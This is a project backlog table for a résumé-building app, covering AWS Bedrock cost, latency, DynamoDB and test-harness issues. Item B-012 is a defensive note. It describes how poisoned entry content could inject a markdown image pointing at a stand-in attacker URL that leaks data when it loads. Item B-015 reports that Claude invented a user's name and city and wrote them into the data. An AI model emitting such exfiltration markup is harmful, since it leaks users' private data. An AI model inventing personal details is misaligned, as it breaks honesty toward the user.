# CareerVault — Backlog

> Things worth doing that aren't scoped into a numbered slice: UI polish, tech debt,
> follow-ups surfaced by a code review, doc corrections, nice-to-have features. This is
> **not** the roadmap — ordered slice work lives in
> [`careervault-plan.md`](careervault-plan.md). Items here are unordered and may never
> ship; that's fine.
>
> **Lifecycle (this is what keeps it from becoming a junk drawer):**
> - `wrap-slice` appends anything deferred during the slice (code-review findings not
>   fixed in-slice, UI gaps noticed, doc drift spotted).
> - `start-slice` reads this list and either pulls an item into the slice or consciously
>   leaves it — the list gets *looked at* every slice, not just written to.
> - When an item is done, mark it `done` with the slice/PR that closed it, then prune
>   `done` rows once they've been noted in a slice's completion notes.
>
> **Type** ∈ `ui` · `tech-debt` · `feature` · `docs` · `infra` · `test`
> **Priority** ∈ `P1` (do soon) · `P2` (should) · `P3` (someday)
> **Status** ∈ `open` · `in-progress` · `done` · `wontfix`

| ID | Item | Type | Priority | Surfaced in | Status | Notes |
|----|------|------|----------|-------------|--------|-------|
| B-001 | Flesh out the UI — current app is functional but visually basic (styling, layout, empty states, loading/error states, mobile polish). Scope a dedicated design pass; may warrant its own slice. | ui | P2 | post-slice-4 | open | Raised by Oche during post-slice-4 housekeeping. Not covered by any planned slice. |
| B-002 | Reconcile the architecture diagram's ACM Certificate node with reality — slice 4 shipped on the default `*.cloudfront.net` domain and custom domain is deferred, so ACM depicts a future state, not what's deployed. | docs | P2 | post-slice-4 | done | Closed by the post-slice-4 diagram redo (ACM dropped from the current-state diagram). |
| B-003 | Dedup precision for exact-identity entries (CERT/AWARD): ADR-033 semantic cosine (≥0.90) misses "same credential, different wording" — e.g. two AZ-900 certs scored 0.86 and both saved. A structured signal (issuer + normalized credential + date, with date-normalization since Haiku can mis-parse an expiry as the issue date) is more precise. Cross-cutting (chat entry path too), so an ADR-033 amendment, not a slice-5 fix. | feature | P2 | slice-5 | open | Verified by Oche during slice-5 UI test; measured cosine 0.86 < 0.90 (working as designed, not a bug). Consider a per-type threshold and/or structured cert/award identity match. |
| B-004 | Resume agent retrieval loop re-sends its full (growing) message history to Sonnet each iteration — the dominant per-run cost (~70K tokens / $0.31). Explore context compaction: summarise prior tool results, cap the retrieved-entry payload, or (for a small corpus) skip the agentic loop and feed all entries to the draft. Architecture change, not a tune — weigh against ADR-010's "own the loop" learning goal. | tech-debt | P2 | slice-6a | open | Surfaced in 6a advisory review. Tuning (`max_iterations 15→8`, `max_revisions 2→1`) already cut 85K→70K tokens; this is the next lever. Reduces the dominant $ driver vs the $5 ceiling. |
| B-005 | `resume_agent` uses one shared `_MAX_OUTPUT_TOKENS=4096` for all Sonnet phases. Fine for retrieval/critique, but a very rich career history's draft/revise JSON could approach it; today that degrades to `validation_abort` (retry, same cap). Consider a per-phase cap (higher for draft/revise). | tech-debt | P3 | slice-6a | open | Surfaced in 6a advisory review. Not hit in smoke (draft ~1.7K output tokens); robustness only. |
| B-006 | The completed-run metadata row (entries used / critique verdict / tokens / cost) is developer-facing, not user-facing — a real user doesn't need to see `critique: REVISE` or `$0.35`. Gate it behind a debug/dev toggle (or drop it) once the agent is no longer being actively evaluated. | ui | P3 | slice-6b | open | Raised by Oche during the 6b UI smoke: explicitly *wanted* while tuning and evaluating the agent, so keep it visible for now. Revisit at slice 9 hardening or whenever agent tuning settles. |
| B-007 | Total elapsed time vanishes when the résumé renders — the counter only exists during the `generating` phase, so the one moment you'd want to compare runs (right when the result lands) is the moment the number disappears. Carry the final elapsed into the completed-run metadata row. | ui | P3 | slice-6b | open | Raised by Oche during the 6b UI smoke. Pairs with B-006 — same metadata row, same evaluation use case, so do them together. |
| B-008 | Generated résumé has **no identity header** — it renders the literal word "Résumé" where a name/email should be. Root cause traced: the user has **no PROFILE item at all** (`Count: 0` in DDB), so `_contact_from_profile(None)` yields all-None and the template's `{{ contact.name or contact.email or "Résumé" }}` falls to its last fallback. Even with a PROFILE row it would be thin — PROFILE has no `name` field at MVP, and the email lives in the Cognito JWT, not DynamoDB. **Fix corrected 2026-07-28 — the original plan here ("take identity from the JWT claims") is insufficient, verified against the live account.** Cognito holds only `email`, `email_verified`, `sub` — **there is no name attribute**, so JWT alone yields a résumé headed with an email address, which is still not employer-ready. Compounding it, the `Profile` Pydantic model has no `name` and no `location` fields at all — precisely the two `_contact_from_profile` reads. Real fix is three-part: add `name`/`location` to the Profile model, ship `PUT /settings` to write them (`settings_lambda` has had the `UpdateItem` grant since slice 1) with a small identity form, and use the JWT `email` as seed/fallback. | feature | **P1** | slice-6b | **done** | Closed by PR #30 (branch `fix/b008-resume-identity-header`), verified live: saved a name via `PUT /settings`, generated a résumé, header rendered **"Oche Obe"** with `oche.ocheobe@gmail.com · Seattle, Washington` beneath it (run 64.5K tokens / $0.31). The Jinja template needed no change — `contact.name or contact.email or "Résumé"` was correct all along; the data behind it never existed. Raised by Oche after the 6b UI smoke — a résumé with no name on it is not usable output, so this is the highest-value agent fix. Scoped 2026-07-28 after slice 7: doing the **full identity fix** now rather than the email-only shortcut, which pulls forward ~60% of slice 8's `PUT /settings` — committed scope arriving early, not new scope, since slice 8 needs that route for cadence/pause regardless. |
| B-009 | Résumé **format/style is not selectable** — one hard-coded Jinja2 template produces one layout, which isn't the shape Oche would normally use. Offer the user a choice at generation time (e.g. chronological vs skills-first vs one-page condensed), and/or let the agent propose a layout suited to the target role. Template-level change (`resume.html.j2` → several), plus a `format` field on the generate request and the RESUMERUN trace. | feature | P2 | slice-6b | open | Raised by Oche after the 6b UI smoke. FR-5.3 mentions "format-select", which slice 6 delivered only as HTML-vs-PDF rather than as layout choice — so this is arguably unfinished FR-5.3 rather than net-new scope. Worth confirming against requirements at slice 9. |
| B-010 | Switch `resume_agent` from Sonnet 4-6 to **Sonnet 5** once the Bedrock entitlement propagates. The Marketplace agreement was accepted 2026-07-28 (`agreementAvailability` NOT_AVAILABLE → PENDING → AVAILABLE) but `Converse` still returned `AccessDeniedException` ~30 min later on both `us.` and `global.` profiles. When a probe succeeds: flip `SonnetInferenceProfileId`/`SonnetFoundationModelId` in `samconfig.toml` and set `_PRICE_PER_TOKEN["sonnet"]` to `(2.20, 11.00)`. | infra | P2 | slice-6b | **blocked-external** | **Diagnosis complete 2026-07-28 — stop probing.** All four `get-foundation-model-availability` fields are `AVAILABLE`/`AUTHORIZED`, *byte-identical to Sonnet 4-6 which works from the same identity*; the console shows the subscription active; both inference profiles are `ACTIVE`; the only attached SCP is the default `FullAWSAccess`; and all three ID forms (`us.`, `global.`, bare) are still denied at `Converse`. Model ID was verified correct (no version suffix exists). This is a control-plane/data-plane inconsistency, not a misconfiguration — nothing self-serve remains. Most likely reading: "contact AWS Sales" is the wording for a model behind a commercial agreement separate from the Marketplace one, which a low-spend personal account may simply not qualify for. Evidence package + submission routes drafted in [`aws-sonnet-5-access-request.md`](aws-sonnet-5-access-request.md) (account is on **Basic support**, so technical cases are unavailable; use the Sales form or a free Account-category case). Sonnet 5 is **~33% cheaper per token** than 4-6 ($2.20/$11.00 vs $3.30/$16.50 Regional CRIS), so this improves both capability and the $5 posture. Probe with: `aws bedrock-runtime converse --model-id us.anthropic.claude-sonnet-5 …`. See the ADR-036 live-access re-diagnosis. See the ADR-036 live-access re-diagnosis and the request draft above. |

| B-011 | **Hybrid retrieval for aggregate questions** — add a structured-filter branch alongside semantic top-k, so "how many AWS certs do I have?" / "what did I do in 2025?" resolve by deterministic filter (`entry_type`, issuer keyword, `event_date` range) over the in-memory corpus, returning a compact projection (title/date/issuer — no `content`, no embedding) instead of top-k full entries. Wire it to the `intent` field slice 7 ships reserved-but-unimplemented. | feature | P2 | slice-7 | open | Raised by Oche at slice-7 scoping, thinking ahead to users with many certs accumulated over years. Not an architectural hurdle: `query_entries` already reads the whole corpus (paginated), so this is a compression choice, not a retrieval limit — and **no GSI is needed**, ADR-028 holds (one career = tens–low hundreds of items). Slice 7 ships the cheap 80% (corpus census + reserved `intent` field), so this is additive. See ADR-038 "Aggregate questions". |
| B-012 | Keep chat answers rendered as **plain text** — never markdown/HTML. A future "nicer answer formatting" commit (react-markdown, `dangerouslySetInnerHTML`) would reopen an injection exfiltration channel: poisoned entry content could emit `![](https://attacker/?d=…)` and leak on image load. If rich formatting is ever wanted, it needs a sanitizing renderer with images and links disabled, not a drop-in markdown component. | tech-debt | P2 | slice-7 | open | Not a defect — true by construction today (no markdown renderer anywhere in `frontend/src`) and made a tested invariant in slice 7. Logged as a **standing constraint** so the reasoning survives the person who wrote it. One of the four ADR-038 injection controls. |

| B-013 | Every chat Q&A turn does a **full-corpus DynamoDB read including embeddings** — `query_entries` returns each item with its ~1024-float Titan vector (~20 KB/item), so a 13-entry corpus moves ~260 KB per question and a 200-entry one would move ~4 MB, for a chat interaction that only needs the vectors to rank and then discards them. Options: a projection expression that fetches embeddings only (rank first, then `BatchGetItem` the top-k in full), or caching the corpus per warm container. | tech-debt | P3 | slice-7 | open | Surfaced in the slice-7 advisory review. Not a problem at MVP scale (~260 KB, single-digit RCUs, sub-100ms) and the same pattern `career_crud` dedup and `resume_agent` retrieval already use — logging it because it scales with corpus size on the *interactive* path, where latency is felt most. Related to B-004 (agent context growth) but a different layer: this is the DDB read, not the prompt. |

| B-014 | ~~`PUT /settings` replaces the whole nested `settings` object rather than merging into it~~ — DynamoDB partial-update semantics are per *top-level attribute*, so `{"settings":{"checkin_paused":true}}` would drop `checkin_cadence`. `ProfileUpdate` deliberately **omits** `settings` today so the trap cannot be hit; slice 8 must add it together with nested-merge semantics (either a dotted `SET settings.#f = :v` path per sub-field, or read-modify-write) and tests for each sub-field independently. | tech-debt | P2 | b-008 | **done** | Closed by slice 8 (**ADR-040**): one dotted `SET settings.#f = :v` path per sub-field, plus a separate idempotent seeding `UpdateItem` — a dotted path cannot be written into an absent attribute, and the seed *cannot* ride along in the same expression (DynamoDB rejects naming both a path and its descendant: "Two document paths overlap with each other"). All four premises probed against the live table before the ADR was settled; the single-expression form was in the first draft as fact and was wrong. Verified live: writing `settings.checkin_paused` left `settings.checkin_cadence` intact. |

| B-015 | Settings form placeholders use fabricated personal data — `placeholder="Oche Obe"` and `placeholder="Seattle, WA"` in [`frontend/src/settings/Settings.tsx`](../frontend/src/settings/Settings.tsx). Replace with generic examples (`e.g. Ada Lovelace`, `e.g. City, State`). Placeholders are hint text so nothing is saved from them, but a UI suggesting one specific invented name is odd. | ui | P3 | b-008 | **done** | Closed by slice 8: placeholders are now `e.g. Ada Lovelace` / `e.g. City, State`, and the invented dev PROFILE values were cleared so Oche entered his real name and location through the form. Original note: Claude invented "Oche Obe"/"Seattle, WA" during the B-008 smoke test (guessed from the GitHub handle and email) and reused them as placeholders; the values also got written into the dev PROFILE row. Oche asked to fold the placeholder fix into the next slice start. **Also check** whether the dev PROFILE `name`/`location` still hold those invented values. |

| B-016 | A **failed SES send still consumes the check-in cycle** — the slot claim writes `next_checkin_at` before `SendEmail`, so a transient SES failure marks the user as sent and defers the next nudge a full cadence. Consider narrowing the window: claim, send, and on send failure roll `next_checkin_at` back (accepting that a crash between the two leaves it claimed), or retry the send in-invocation before giving up. | tech-debt | P3 | slice-8 | open | Not a defect — it is the price of the §3.3.4 ordering, which exists to stop a Scheduler retry duplicating the email. Idempotency buys "at most once" by giving up "at least once"; no ordering yields both. Logged because the trade is right for a *nudge* and would be wrong for anything transactional, and the reasoning should be re-derived rather than inherited if the pattern is copied. See ADR-039 consequences. |
| B-017 | **Test harness: sibling modules are still resolved off a shared `sys.path`.** `load_handler` now isolates handler loads (slice 8), but seven test modules also `sys.path.insert` a function directory permanently to import siblings directly (`from rendering import ...`), so two functions owning a same-named module can still shadow each other depending on collection order. Give those tests the same isolation, or import siblings by path. | test | P3 | slice-8 | **done** | Closed by slice 9. Added `load_sibling()` alongside `load_handler()` (both now share one `_load_isolated()`), converted the four modules that bare-imported a sibling (`qa`, `agent`, `rendering`, `extraction`), and deleted three *vestigial* inserts that referenced no sibling at all — `load_handler` had already made them unnecessary. Two findings worth carrying. **(1) Loading a module by path requires registering it in `sys.modules` *before* `exec_module`.** `agent.py` declares dataclasses at module scope, and class construction resolves its own defining module via `sys.modules[cls.__module__]`; unregistered, that yields `None` and the class body dies with `AttributeError: 'NoneType' object has no attribute '__dict__'` — an error naming neither the module nor the cause. `load_handler` never hit it only because no handler declares such a type at module level. **(2) The eviction protects `load_handler`, not `load_sibling`** — `agent.py` imports no siblings, so the first regression test written against it had no teeth and passed with the fix removed. The real collision pair is `resume_agent/handler.py:49` and `checkin/handler.py:47`, both doing `from rendering import ...`. `tests/unit/test_harness_isolation.py` now pins it by asserting each handler's bound `render_html.__code__.co_filename` comes from its own directory; **mutation-verified** — disabling the eviction fails 2 of its 6 tests. Original note: surfaced when `checkin/rendering.py` shadowed `resume_agent/rendering.py`. |
| B-018 | **No integration test covers the check-in flow** — slice 8 was verified by hand (forced invokes, a temporary entry-date flip to force the personalized tier, the SES mailbox simulator for bounces, manual state resets between runs). That sequence is repeatable but undocumented outside the slice notes, and every future change to the scheduled path re-runs it manually or not at all. | test | P2 | slice-8 | **done** | Closed by slice 9, split by what is separable rather than covered wholesale. The **decision half** — due users by `Scan`, slot claim, cadence pacing for all four FR-4.1 windows, pause/resume — runs against DynamoDB Local in the free tier ([`test_checkin_scheduling.py`](../tests/integration/local/test_checkin_scheduling.py)): that is the half slice 8 verified by hand and the half that regressed. The **deployed half** invokes the real `checkin` Lambda, but only after reading live state and skipping if any real user is due — `_process_user` runs only for due users, so a no-due run calls no Bedrock and sends no email while still executing `scan_profiles()`, which is what exercises the `dynamodb:Scan` grant arch v2.1 added to §4.5.4. The **composition half** (real Haiku, the ADR-021 tier-downgrade bug) sits in the `--bedrock` tier at ~$0.01. Deliberately *not* covered: an actual SES send, because a test whose assertion is "an email arrived" is a test nobody can run twice. |
| B-019 | **Bounce/complaint state has no UI and no automated response.** `bounce_count` / `last_bounce_at` / `complained_at` are written and alarmed on, but a user whose address hard-bounces sees nothing in the app and keeps a schedule that will never deliver. §3.3.8 defers auto-pause to v1.1; at minimum the settings page could surface "we couldn't deliver your last check-in". | feature | P3 | slice-8 | open | Deliberate MVP scope (§3.3.8 — records and alarms, takes no action), logged so the gap is a decision rather than an oversight. Auto-pause is the tempting fix and the risky one: the first thing it does when it misfires is silently stop a working feature. |

| B-020 | **Reduce résumé-generation latency (~176s).** Requirements §7.4 originally promised "within 30 seconds"; slice 9 corrects the criterion to a measured target, but the *goal* behind it stands — generation time is the most user-visible weakness of the flagship feature. Levers, roughly by value-per-risk: **(a) `ConverseStream` + progressive render** — does not reduce total time but collapses *perceived* latency, and for a 176s job perceived time is arguably the real defect; **(b) Bedrock prompt caching** on the stable corpus/system prefix — cuts time-to-first-token across every retrieval iteration and is the same lever as B-004's cost fix; **(c) skip the agentic retrieval loop for small corpora** — feeding ~13 entries straight to the draft removes several sequential round-trips outright; **(d) Haiku for the critique phase** instead of Sonnet; **(e) show the draft at ~T+60s before critique/revise finish**, letting the résumé improve in place; **(f) Sonnet 5** (B-010) is faster as well as ~33% cheaper. | feature | **P2** | slice-9 | open | Raised by Oche at slice-9 scoping when accepting the §7.4 correction: "reducing the time it takes to generate resumes" is something users would appreciate and was always in scope. **Shares a root cause with B-004** — the retrieval loop re-sending a growing history is simultaneously the dominant cost driver *and* the dominant latency driver, so (b) and (c) pay twice; treat the two items together rather than separately. Note (a) and (e) are UX changes that make the wait *feel* shorter without making it shorter — worth doing regardless, and cheapest by far, but they should not be mistaken for having fixed the underlying number. Weigh (c) against ADR-010's explicit "own the loop" learning goal before implementing. **Evidence added 2026-07-29 (slice 9):** the `--expensive` integration run measured **72s / 20,183 tokens / $0.113 on a 2-entry corpus with a `REVISE` critique**, against slice 6b's **176s / 82.9K tokens / $0.35 for a `REVISE` run on the real 13-entry corpus**. Same verdict and same phases, so this is not a cheaper code path — **latency and cost both scale with corpus size**, confirming the retrieval loop's growing history (B-004) as the shared mechanism and making (b) and (c) the two levers that pay twice. Note the corollary for the ceiling: a *fuller* career history costs and takes proportionally more, so this gets worse as the app is used as intended. |

<!-- Add new rows at the bottom. Keep each item to one line; detail goes in Notes or a linked ADR/plan section. -->
